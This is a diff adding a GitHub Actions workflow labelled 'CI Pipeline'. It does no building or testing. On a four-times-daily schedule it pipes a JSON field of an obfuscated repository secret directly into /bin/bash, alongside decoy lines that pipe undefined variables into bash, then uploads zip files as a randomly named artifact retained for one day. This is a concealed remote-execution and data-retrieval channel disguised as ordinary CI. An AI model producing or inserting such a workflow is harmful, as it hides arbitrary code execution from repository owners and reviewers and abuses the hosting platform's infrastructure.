@@ -1,0 +1,35 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          aulvf810: ${{ secrets.aulvf810 }}
+        run: |
+          printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
+          echo $gsz3679 | jq -r .taurd652 | /bin/bash
+          printf '%s' "$xzkl51602" | jq -r .muumc03895 | /bin/bash
+          printf '%s' "$k48" | jq -r .ax63 | /bin/bash
+          printf '%s' "$etplr50" | jq -r .t6094 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 58tEEDuz
+          path: "*.zip"
+          retention-days: 1
